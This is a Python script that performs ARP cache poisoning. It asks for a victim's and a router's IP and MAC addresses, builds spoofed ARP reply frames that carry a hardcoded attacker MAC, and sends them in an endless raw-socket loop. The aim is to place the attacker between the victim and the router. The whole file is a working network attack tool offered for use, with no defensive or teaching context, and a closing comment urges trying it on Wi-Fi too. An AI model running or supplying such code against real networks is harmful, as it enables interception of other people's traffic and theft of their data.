import socket,binascii,sys

info = []
final_payload = []

def get_info():
	router_ip = input('[>]Enter router I.P:')
	victim_ip = input('[>]Enter victim I.P:')
	if len(router_ip) > 14 or len(victim_ip) > 14 : 
		sys.exit('[!]IP too long. Exiting and preventing BuffOver flow attack.')
	router_MAC = input('[>]Enter router MAC:')
	victim_MAC = input('[>]Enter victim MAC:')
	if len(router_MAC) > 17 or len(victim_MAC) > 17 :
		sys.exit('[!]MAC address too long. Exiting and preventing BuffOver flow attack.')
	info.append(victim_ip)
	info.append(victim_MAC)
	info.append(router_ip)
	info.append(router_MAC)

def Arp_poisining(victim_ip,victim_MAC,router_ip,router_MAC):
	victim_ip = socket.inet_aton(victim_ip)
	victim_MAC = binascii.unhexlify(victim_MAC.replace(':',''))
	print('[>]Verifying data : ',victim_ip,victim_MAC)
	router_ip = socket.inet_aton(router_ip)
	router_MAC = binascii.unhexlify(router_MAC.replace(':',''))
	print('[>]Verifying data : ',router_ip,router_MAC)
	arp_code = '\x08\x06'.encode()
	hardware_type = '\x00\x01'.encode() #Denotes the Ethernet
	protocol_type = '\x08\x00'.encode() #ether protocol for IPv4 
	hardw_add_leng = '\x06'.encode()
	prot_add_leng = '\x04'.encode()
	op_code = '\x00\x02'.encode() # Code which tells it's a ARP reply
	my_MAC = '00:17:42:2e:11:83'
	source_addr = binascii.unhexlify(my_MAC.replace(':','')) #See note (1)
	source_ip = socket.inet_aton('192.168.178.54')
	
	send_victim = victim_MAC + source_addr + arp_code + hardware_type+\
	protocol_type + hardw_add_leng + prot_add_leng + op_code + source_addr +\
	router_ip + victim_MAC + victim_ip

	send_router = router_MAC + source_addr + arp_code + hardware_type+\
	protocol_type + hardw_add_leng + prot_add_leng + op_code + source_addr+\
	victim_ip + router_MAC + router_ip

	final_payload.append(send_victim)
	final_payload.append(send_router)

def main():
	get_info()
	Arp_poisining(info[0],info[1],info[2],info[3])
	s1 = socket.socket(socket.PF_PACKET,socket.SOCK_RAW, socket.ntohs(0x0800)) 
	s1.bind(('eth0',socket.htons(0x0800)))
	while True:
		s1.send(final_payload[0]) # send victim
		s1.send(final_payload[1]) # send router

main()

#do not forget it to try it with wifi too. 
